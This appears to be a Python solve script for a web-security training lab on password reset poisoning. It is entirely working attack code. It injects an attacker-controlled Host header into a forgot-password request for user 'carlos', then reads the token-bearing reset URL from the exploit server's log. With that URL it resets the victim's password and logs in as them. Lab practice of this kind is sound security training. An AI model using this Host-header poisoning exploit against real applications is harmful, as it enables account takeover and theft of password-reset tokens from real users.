# Basic password reset poisoning

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_carlos(s, url):
	print('\n[+] Trying to connect to the application as Carlos...')
	login_path = url + '/login'
	r = s.get(login_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	time.sleep(1)
	data_login = {'username': 'carlos', 'password': 'Password123!', 'csrf': csrf_token}
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: carlos' in r.text:
		print('[+] Successfully connected as Carlos !')
		return r
	else:
		print('[-] Exploit failed to connect as Carlos <!>')
		sys.exit(1)

def get_carlos_token(s, url, attacker):
	print('\n[+] Trying to generate and retrieve a reset password token for Carlos user...')
	forgot_path = url + '/forgot-password'
	r = s.get(forgot_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	forgot_data = {'csrf': csrf_token, 'username': 'carlos'}
	headers = {'Host': attacker}
	cookies = {'session': s.cookies['session'], '_lab': s.cookies['_lab']}
	r = s.post(forgot_path, data=forgot_data, headers=headers, cookies=cookies)
	time.sleep(8)
	log_path = 'https://' + attacker + '/log'
	r = s.get(log_path)
	reset_path = re.findall(r"&quot;GET (.*) HTTP/1.1&quot", r.text)[-1]
	print('[+] Generated URL for Carlos Password Reset:\t%s' % reset_path)
	time.sleep(1)
	return url + reset_path

def reset_password(s, url, reset_path):
	print('\n[+] Trying to reset password for Carlos user...')
	token = reset_path.split('=')[1]
	r = s.get(reset_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	reset_data = {
		'temp-forgot-password-token': token,
		'csrf': csrf_token,
		'new-password-1': 'Password123!',
		'new-password-2': 'Password123!'
	}
	r = s.post(reset_path, data=reset_data)

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv
	else:
		print("[-] Didn't find exploit server on the home page <!>")
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Basic password reset poisoning')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			exploit_srv = find_exploit_srv(r)
			attacker = urllib.parse.urlparse(exploit_srv).scheme + "://" + urllib.parse.urlparse(exploit_srv).netloc
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			reset_path = get_carlos_token(s, url, urllib.parse.urlparse(exploit_srv).netloc)
			reset_password(s, url, reset_path)
			connect_as_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
